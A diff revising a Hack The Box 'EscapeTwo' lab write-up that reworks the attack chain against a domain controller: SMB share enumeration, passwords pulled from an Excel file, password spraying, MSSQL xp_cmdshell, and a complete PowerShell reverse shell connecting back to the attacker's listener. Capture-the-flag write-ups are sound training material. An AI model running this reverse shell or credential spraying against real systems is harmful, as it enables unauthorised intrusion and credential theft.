@@ -82,23 +82,6 @@ echo 'rose' > users.txt
 echo 'KxEPkKe6R8su' > creds.txt
 ```
 
-### Share Enumeration
-
-Started my enumeration by using the credentials to look for accessible SMB file shares.
-```bash
-nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --shares 
-
-...
-SMB         10.10.11.51     445    DC01             -----           -----------     ------
-SMB         10.10.11.51     445    DC01             Accounting Department READ            
-SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
-SMB         10.10.11.51     445    DC01             C$                              Default share
-SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
-SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
-SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
-SMB         10.10.11.51     445    DC01             Users           READ  
-```
-
 ### User Discovery
 
 LDAP enumeration built comprehensive user list for password spraying:
@@ -116,9 +99,28 @@ rose
 ca_svc
 ```
 
+### Share Enumeration
+
+Also used the credentials to look for accessible file shares.
+```bash
+nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --shares 
+
+...
+SMB         10.10.11.51     445    DC01             -----           -----------     ------
+SMB         10.10.11.51     445    DC01             Accounting Department READ            
+SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.51     445    DC01             C$                              Default share
+SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.11.51     445    DC01             Users           READ  
+```
+
+
+
 ### File System Analysis
 
-SMB share spidering revealed organizational documents containing credentials:
+SMB share spidering revealed a share called `Accounting Department`.
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
@@ -129,48 +131,23 @@ cp -r /home/wither/.nxc/modules/nxc_spider_plus/10.10.11.51 .
 
 ### Credential Extraction from Excel Files
 
-Excel file analysis revealed embedded passwords in XML structure:
+The share contained two files, `accounting_2024.xlsx` and `accounts.xlsx`. I unzipped and searched `accounts.xlsx` to find a list of credentials in the `xl/sharedStrings.xml` file.
 
 ```bash
 ls
 accounting_2024.xlsx  accounts.xlsx
 
-unzip accounts.xlsx       
-Archive:  accounts.xlsx
-file #1:  bad zipfile offset (local header sig):  0
-  inflating: xl/workbook.xml         
-  inflating: xl/theme/theme1.xml     
-  inflating: xl/styles.xml           
-  inflating: xl/worksheets/_rels/sheet1.xml.rels  
-  inflating: xl/worksheets/sheet1.xml  
-  inflating: xl/sharedStrings.xml    
-  inflating: _rels/.rels             
-  inflating: docProps/core.xml       
-  inflating: docProps/app.xml        
-  inflating: docProps/custom.xml     
-  inflating: [Content_Types].xml     
-                                                                                                                                                                                             
-wither@kali:~/CTF/HTB/EscapeTwo/files/10.10.11.51/Accounting Department$ grep -r "Password" > sharedstrings.txt                                                                  
+unzip accounts.xlsx                                                                                                                                             grep -r "Password" > sharedstrings.txt                                                                  
 xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
 ```
 
-Add `sa` to users 
-```bash
-echo 'sa' >> users.txt
-```
-
-Extracted credentials from XML structure and built password list:
-
+I extracted the passwords from the XML structure and added them to the password list `creds.txt`.
 ```bash
 grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '10p;15p;20p;24p' | sed -E 's/<\/?t[^>]*>//g' >> creds.txt 
 
 cat creds.txt 
 
 KxEPkKe6R8su
-0fwz7Q4mSpurIt99
-86LxLBMgEWaKUnBG
-Md9Wlq1E5bZnVDVo
-MSSQLP@ssw0rd!
 0fwz7Q4mSpurIt99
 86LxLBMgEWaKUnBG
 Md9Wlq1E5bZnVDVo
@@ -201,23 +178,9 @@ sa
 
 ## Phase 2: Exploitation - Credential Access & Database Infiltration
 
-### Password Spraying Attack
-
-Password spraying revealed multiple valid accounts including privileged SQL service account:
-
-```bash
-nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success                                                     
-...
-SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
-...
-SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
-...
-```
-
 ### SQL Server Access
 
-`sa` account provided local authentication to SQL Server:
-
+The `sa` service account provided local authentication to the MSSQL server:
 ```bash
 echo 'sa' >> users.txt
 
@@ -229,21 +192,19 @@ MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (
 
 ### Command Execution via SQL
 
-Leveraged SQL Server `xp_cmdshell` functionality for remote code execution:
-
+From this, I leveraged the MSSQL server's `xp_cmdshell` functionality for remote code execution. I opened up a netcat listener:
 ```bash
 nc -nvlp 9001
 ```
 
-Send a Powershell reverse shell using the `sa` account
+And sent a Powershell reverse shell.
 ```bash
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth -X '$LHOST = "10.10.14.17"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
 ```
 
 ### Additional Credential Discovery
 
-SQL Server configuration files revealed service account credentials:
-
+In the shell, I found the MSSQL server configuration file `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`, which revealed another service account `sql_svc`'s credentials `WqSZAF6CysDQbGb3`:
 ```powershell
 pwd
 C:\SQL2019\ExpressAdv_ENU
@@ -254,14 +215,14 @@ SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
 ...
 ```
 
+I added the password to the password list.
 ```bash
 echo 'WqSZAF6CysDQbGb3' >> creds.txt
 ```
 
 ### Password Reuse Discovery
 
-Extended password spraying revealed credential reuse patterns:
-
+I sprayed for WinRM access again with the new password, which revealed credential reuse on the `ryan` account, who shared a password with `sql_svc`:
 ```bash
 nxc winrm 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success
 
@@ -270,7 +231,7 @@ WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6C
 ...
 ```
 
-User flag in ryans desktop
+The user flag was in `ryan`'s Desktop
 ```powershell
 *Evil-WinRM* PS C:\Users\ryan\Documents> more ../Desktop/user.txt
 ```
@@ -281,8 +242,7 @@ User flag in ryans desktop
 
 ### Domain Analysis
 
-BloodHound data collection to identify privilege escalation paths:
-
+I used the remote shell to upload the BloodHound data collection tool "SharpHound" to identify privilege escalation paths:
 ```powershell
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --put-file SharpHound.exe 'C:\Users\Public\SharpHound.exe'
 
@@ -292,7 +252,7 @@ MSSQL       10.10.11.51     1433   DC01             [*] Size is 1286656 bytes
 MSSQL       10.10.11.51     1433   DC01             [+] File has been uploaded on the remote machine
 ```
 
-Collect the loot
+I downloaded trh
 ```powershell
 pwd
 C:\users\public
